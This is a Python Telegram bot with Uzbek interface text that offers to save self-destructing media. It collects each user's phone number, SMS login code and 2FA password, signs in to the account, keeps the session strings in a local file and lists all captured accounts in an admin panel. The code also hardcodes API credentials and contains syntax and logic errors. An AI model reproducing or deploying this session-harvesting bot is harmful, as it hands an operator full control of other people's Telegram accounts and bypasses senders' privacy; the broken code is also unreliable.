import os
import logging
import asyncio
import json
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, FloodWaitError
from datetime import datetime
from collections import defaultdict

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

API_ID = 10953300
API_HASH = '9c24426e5d6fa1d441913e3906627f87'
MAIN_BOT_TOKEN = 'Telegram bot tokeningizni kiriting!'
ADMIN_ID = telegram foydalanuvchi id ingizni kiriting! 

USER_SESSIONS = {}
CONNECTED_ACCOUNTS = {}
USER_SETTINGS = {}
SAVE_COUNTER = defaultdict(lambda: defaultdict(int))

SETTINGS_FILE = 'user_settings.json'
SESSION_FILE = 'sessions.json'
COUNTER_FILE = 'save_counter.json'

if not os.path.exists('sessions'):
    os.makedirs('sessions')

def load_data():
    global USER_SETTINGS, SAVE_COUNTER, CONNECTED_ACCOUNTS
    
    if os.path.exists(SETTINGS_FILE):
        try:
            with open(SETTINGS_FILE, 'r') as f:
                USER_SETTINGS = json.load(f)
        except:
            USER_SETTINGS = {}
    
    if os.path.exists(SESSION_FILE):
        try:
            with open(SESSION_FILE, 'r') as f:
                sessions = json.load(f)
                for phone, session_str in sessions.items():
                    if phone not in CONNECTED_ACCOUNTS:
                        CONNECTED_ACCOUNTS[phone] = {
                            'session_str': session_str,
                            'faol': False,
                            'bot_token': MAIN_BOT_TOKEN
                        }
        except:
            pass
    
    if os.path.exists(COUNTER_FILE):
        try:
            with open(COUNTER_FILE, 'r') as f:
                loaded = json.load(f)
                SAVE_COUNTER.clear()
                for phone, users in loaded.items():
                    SAVE_COUNTER[phone] = defaultdict(int, users)
        except:
            SAVE_COUNTER = defaultdict(lambda: defaultdict(int))

def save_data():
    with open(SETTINGS_FILE, 'w') as f:
        json.dump(USER_SETTINGS, f)
    
    sessions = {}
    for phone, acc in CONNECTED_ACCOUNTS.items():
        if 'session_str' in acc:
            sessions[phone] = acc['session_str']
    with open(SESSION_FILE, 'w') as f:
        json.dump(sessions, f)
    
    save_counter_dict = {}
    for phone, users in SAVE_COUNTER.items():
        save_counter_dict[phone] = dict(users)
    
    with open(COUNTER_FILE, 'w') as f:
        json.dump(save_counter_dict, f)

async def start_client(phone, session_str=None):
    try:
        if session_str:
            client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
        else:
            session_file = f"sessions/{phone.replace('+', '')}.session"
            client = TelegramClient(session_file, API_ID, API_HASH)
        
        await client.connect()
        
        if not await client.is_user_authorized():
            await client.disconnect()
            return None
            
        return client
    except Exception as e:
        logger.error(f"Klientni ishga tushirishda xato {phone}: {str(e)}")
        return None

async def activate_account(phone, session_str):
    client = await start_client(phone, session_str)
    if not client:
        return False
        
    me = await client.get_me()
    CONNECTED_ACCOUNTS[phone] = {
        'client': client,
        'ulangan_vaqt': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'faol': True,
        'me': me,
        'session_str': session_str,
        'bot_token': MAIN_BOT_TOKEN
    }
    
    client.add_event_handler(
        lambda e: handle_media_saving(client, e),
        events.NewMessage(outgoing=True, pattern=r'\.rsave')
    )
    
    client._phone = phone
    return True

async def load_connected_accounts():
    for phone, acc_data in list(CONNECTED_ACCOUNTS.items()):
        if 'session_str' in acc_data and not acc_data.get('faol', False):
            session_str = acc_data['session_str']
            success = await activate_account(phone, session_str)
            if success:
                logger.info(f"Akkaunt faollashtirildi: {phone}")
            else:
                logger.warning(f"Akkauntni faollashtirib bo'lmadi: {phone}")
                del CONNECTED_ACCOUNTS[phone]

async def handle_media_saving(client, event):
    try:
        user_id = event.sender_id
        user_settings = USER_SETTINGS.get(str(user_id), {})
        if not user_settings.get('media_saving', False):
            return
            
        javob_habar = await event.get_reply_message()
        if not javob_habar or not javob_habar.media:
            return
            
        media_fayl = await javob_habar.download_media()
        telefon_raqam = getattr(client, '_phone', 'noma\'lum')
        
        if telefon_raqam not in SAVE_COUNTER:
            SAVE_COUNTER[telefon_raqam] = defaultdict(int)
        SAVE_COUNTER[telefon_raqam][str(user_id)] += 1
        save_data()
        
        soni = SAVE_COUNTER[telefon_raqam][str(user_id)]
        
        await client.send_file(
            user_id,
            media_fayl,
            caption=f"#{soni} - {telefon_raqam} akkauntidan saqlandi"
        )
        await event.delete()
        
        if os.path.exists(media_fayl):
            os.remove(media_fayl)
    except Exception as e:
        logger.error(f"Media saqlashda xato: {str(e)}")

async def media_sozlamalari(event):
    foydalanuvchi_id = event.sender_id
    faolmi = USER_SETTINGS.get(str(foydalanuvchi_id), {}).get('media_saving', False)
    
    xabar = f"O'chib ketuvchi media saqlash: {'Faollashtirilgan ✅' if faolmi else 'Oʻchirilgan ❌'}"
    tugmalar = [
        [Button.inline("Faollashtirish", b"enable_media")] if not faolmi else [],
        [Button.inline("Oʻchirish", b"disable_media")] if faolmi else [],
        [Button.inline("Orqaga", b"asosiy_menu")]
    ]
    await event.edit(xabar, buttons=tugmalar)

async def media_saqlashni_ozgartir(event, faollashtirish):
    foydalanuvchi_id = event.sender_id
    foydalanuvchi_id_str = str(foydalanuvchi_id)
    
    if foydalanuvchi_id_str not in USER_SETTINGS:
        USER_SETTINGS[foydalanuvchi_id_str] = {}
    
    USER_SETTINGS[foydalanuvchi_id_str]['media_saving'] = faollashtirish
    save_data()
    
    holat = "faollashtirildi ✅" if faollashtirish else "oʻchirildi ❌"
    await event.respond(f"Media saqlash {holat}!")
    await media_sozlamalari(event)

async def kirishni_boshlash(event):
    await event.reply("Telefon raqamingizni kiriting (format: +998...):\nMasalan: +998901234567")
    USER_SESSIONS[event.sender_id] = {'holat': 'telefon_kutilyapti'}

async def telefonni_qayta_ishlash(event):
    telefon = event.text.strip()
    if telefon.startswith("+") and telefon[1:].isdigit():
        client = await start_client(telefon)
        try:
            await client.connect()
            await client.send_code_request(telefon)
            USER_SESSIONS[event.sender_id] = {
                'client': client,
                'telefon': telefon,
                'kod': '',
                'parol_kutilyapti': False,
                'holat': 'kod_kutilyapti',
                'xabar': await event.reply(
                    "SMS orqali kelgan kodni kiriting:",
                    buttons=[
                        [Button.inline('1', b'kod_1'), Button.inline('2', b'kod_2'), Button.inline('3', b'kod_3')],
                        [Button.inline('4', b'kod_4'), Button.inline('5', b'kod_5'), Button.inline('6', b'kod_6')],
                        [Button.inline('7', b'kod_7'), Button.inline('8', b'kod_8'), Button.inline('9', b'kod_9')],
                        [Button.inline('Tozalash', b'kod_clear'), Button.inline('0', b'kod_0'), Button.inline('Bekor qilish', b'cancel')]
                    ]
                )
            }
            CONNECTED_ACCOUNTS[telefon] = {
                'session_str': '',  
                'faol': False,
                'bot_token': MAIN_BOT_TOKEN
            }
        except FloodWaitError as fwe:
            await event.reply(f"Flood xatosi! Iltimos {fwe.seconds} soniyadan keyin urinib ko'ring.")
        except Exception as e:
            await event.reply(f"Xato: {str(e)}")
    else:
        await event.reply("Noto'g'ri format. Iltimos, +998XXXXXXXXX formatida kiriting")

async def kodni_qayta_ishlash(event):
    foydalanuvchi_malumotlari = USER_SESSIONS.get(event.sender_id)
    if not foydalanuvchi_malumotlari or foydalanuvchi_malumotlari.get('holat') != 'kod_kutilyapti':
        await event.reply("Iltimos, avval telefon raqamingizni kiriting.")
        return

    client = foydalanuvchi_malumotlari['client']
    telefon = foydalanuvchi_malumotlari['telefon']

    data = event.data.decode('utf-8')
    if data == "cancel":
        await event.respond("Kirish bekor qilindi!")
        await foydalanuvchi_malumotlari['xabar'].delete()
        del USER_SESSIONS[event.sender_id]
        await asosiy_boshlash_xabari(event)
        return
        
    kod_kiritish = data.split("_")[1] if "_" in data else ""
    
    if kod_kiritish == "clear":
        foydalanuvchi_malumotlari['kod'] = ""
        await foydalanuvchi_malumotlari['xabar'].edit("Kod tozalandi. Yangi kodni kiriting:")
        return
    else:
        foydalanuvchi_malumotlari['kod'] += kod_kiritish

    if len(foydalanuvchi_malumotlari['kod']) >= 5:
        try:
            session_str = client.session.save()
            
            await client.sign_in(telefon, foydalanuvchi_malumotlari['kod'])
            men = await client.get_me()
            
            CONNECTED_ACCOUNTS[telefon] = {
                'client': client,
                'ulangan_vaqt': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                'faol': True,
                'me': men,
                'session_str': session_str,
                'bot_token': MAIN_BOT_TOKEN
            }
            
            client.add_event_handler(
                lambda e: handle_media_saving(client, e),
                events.NewMessage(outgoing=True, pattern=r'\.rsave')
            )
            
            client._phone = telefon
            
            user_id_str = str(event.sender_id)
            if user_id_str not in USER_SETTINGS:
                USER_SETTINGS[user_id_str] = {
                    'media_saving': False,
                    'accounts': [telefon]
                }
            else:
                if telefon not in USER_SETTINGS[user_id_str].get('accounts', []):
                    USER_SETTINGS[user_id_str]['accounts'].append(telefon)
            
            save_data()
            
            tugmalar = [
                [Button.inline("Media saqlash sozlamalari", b"media_settings")],
                [Button.inline("Asosiy menyu", b"asosiy_menu")]
            ]
            
            await event.respond("✅ Akkaunt muvaffaqiyatli ulandi!", buttons=tugmalar)
            await foydalanuvchi_malumotlari['xabar'].delete()
        except SessionPasswordNeededError:
            foydalanuvchi_malumotlari['parol_kutilyapti'] = True
            foydalanuvchi_malumotlari['holat'] = 'parol_kutilyapti'
            await event.respond("Iltimos, 2FA parolingizni kiriting:")
        except Exception as e:
            await event.respond(f"⚠️ Noto'g'ri kod yoki xato: {str(e)}")
    else:
        await foydalanuvchi_malumotlari['xabar'].edit(f"Joriy kod: {foydalanuvchi_malumotlari['kod']}\nQolgan raqamlarni kiriting")

async def parolni_qayta_ishlash(event):
    foydalanuvchi_malumotlari = USER_SESSIONS.get(event.sender_id)
    if not foydalanuvchi_malumotlari or foydalanuvchi_malumotlari.get('holat') != 'parol_kutilyapti':
        await event.reply("Iltimos, avval kodni to'g'ri kiriting.")
        return

    client = foydalanuvchi_malumotlari['client']
    telefon = foydalanuvchi_malumotlari['telefon']
    
    try:
        session_str = client.session.save()
        
        await client.sign_in(password=event.text)
        men = await client.get_me()
        
        CONNECTED_ACCOUNTS[telefon] = {
            'client': client,
            'ulangan_vaqt': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'faol': True,
            'me': men,
            'session_str': session_str,
            'bot_token': MAIN_BOT_TOKEN
        }
        
        client.add_event_handler(
            lambda e: handle_media_saving(client, e),
            events.NewMessage(outgoing=True, pattern=r'\.rsave')
        )
        
        client._phone = telefon
        
        user_id_str = str(event.sender_id)
        if user_id_str not in USER_SETTINGS:
            USER_SETTINGS[user_id_str] = {
                'media_saving': False,
                'accounts': [telefon]
            }
        else:
            if telefon not in USER_SETTINGS[user_id_str].get('accounts', []):
                USER_SETTINGS[user_id_str]['accounts'].append(telefon)
        
        save_data()
        
        tugmalar = [
            [Button.inline("Media saqlash sozlamalari", b"media_settings")],
            [Button.inline("Asosiy menyu", b"asosiy_menu")]
        ]
        
        await event.respond("✅ Akkaunt muvaffaqiyatli ulandi!", buttons=tugmalar)
    except Exception as e:
        await event.respond(f"⚠️ Xato: {str(e)}")

async def asosiy_boshlash_xabari(event):
    user_id_str = str(event.sender_id)

    if user_id_str in USER_SETTINGS:
        tugmalar = [
            [Button.inline("Account qo'shish", b"login")],
            [Button.inline("Ro'yxatdan o'tgan accountlarni faollashtirish", b"activate_accounts")],
            [Button.inline("Media sozlamalari", b"media_settings")]
        ]
        if event.sender_id == ADMIN_ID:
            tugmalar.append([Button.inline("Admin panel", b"admin")])
            
        await event.respond("Botga xush kelibsiz! Quyidagi amallardan birini tanlang:", buttons=tugmalar)
    else:
        if event.sender_id == ADMIN_ID:
            tugmalar = [
                [Button.inline("Kirish", b"login")],
                [Button.inline("Admin panel", b"admin")]
            ]
        else:
            tugmalar = [
                [Button.inline("Kirish", b"login")]
            ]
        await event.respond("Botga xush kelibsiz! Davom etish uchun 'Kirish' tugmasini bosing:", buttons=tugmalar)

async def admin_panel(event):
    if event.sender_id != ADMIN_ID:
        await event.respond("Sizga ruxsat yo'q!")
        return
        
    accounts_list = "\n".join([f"{phone} - {'✅ Faol' if acc['faol'] else '❌ Nofaol'}" 
                              for phone, acc in CONNECTED_ACCOUNTS.items()])
    
    xabar = f"📊 Ulangan akkauntlar: {len(CONNECTED_ACCOUNTS)}\n\n{accounts_list}"
    await event.respond(xabar)

async def activate_all_accounts(event):
    await event.respond("Barcha akkauntlarni faollashtirish jarayoni boshlandi...")
    await load_connected_accounts()
    
    faol_akkauntlar = [phone for phone, acc in CONNECTED_ACCOUNTS.items() if acc.get('faol', False)]
    
    if faol_akkauntlar:
        xabar = "✅ Quyidagi akkauntlar faollashtirildi:\n" + "\n".join(faol_akkauntlar)
    else:
        xabar = "⚠️ Hech qanday akkaunt faollashtirilmadi. Iltimos, avval akkaunt qo'shing."
    
    await event.respond(xabar)

async def asosiy():
    load_data()
    
    asosiy_bot = TelegramClient('asosiy_bot', API_ID, API_HASH)
    await asosiy_bot.start(bot_token=MAIN_BOT_TOKEN)
    
    await load_connected_accounts()
    logger.info(f"{len([acc for acc in CONNECTED_ACCOUNTS.values() if acc.get('faol', False)])} ta akkaunt faollashtirildi")
    
    @asosiy_bot.on(events.NewMessage(pattern='/start'))
    async def asosiy_bot_boshlash(event):
        await asosiy_boshlash_xabari(event)
    
    @asosiy_bot.on(events.CallbackQuery)
    async def asosiy_bot_tugmalar(event):
        data = event.data.decode('utf-8')
        
        if data == "login":
            await kirishni_boshlash(event)
        elif data == "admin" and event.sender_id == ADMIN_ID:
            await admin_panel(event)
        elif data == "media_settings":
            await media_sozlamalari(event)
        elif data == "enable_media":
            await media_saqlashni_ozgartir(event, True)
        elif data == "disable_media":
            await media_saqlashni_ozgartir(event, False)
        elif data == "asosiy_menu":
            await asosiy_boshlash_xabari(event)
        elif data == "activate_accounts":
            await activate_all_accounts(event)
        elif data.startswith("kod_"):
            await kodni_qayta_ishlash(event)
        elif data == "cancel":
            await event.respond("Amal bekor qilindi!")
            await asosiy_boshlash_xabari(event)
    
    @asosiy_bot.on(events.NewMessage)
    async def asosiy_bot_xabarlar(event):
        foydalanuvchi_malumotlari = USER_SESSIONS.get(event.sender_id)
        if not foydalanuvchi_malumotlari:
            return
        
        if foydalanuvchi_malumotlari.get('holat') == 'telefon_kutilyapti':
            await telefonni_qayta_ishlash(event)
        elif foydalanuvchi_malumotlari.get('holat') == 'parol_kutilyapti':
            await parolni_qayta_ishlash(event)
    
    logger.info("Asosiy bot ishga tushirildi")
    await asosiy_bot.run_until_disconnected()

if __name__ == '__main__':
    asyncio.run(asosiy())
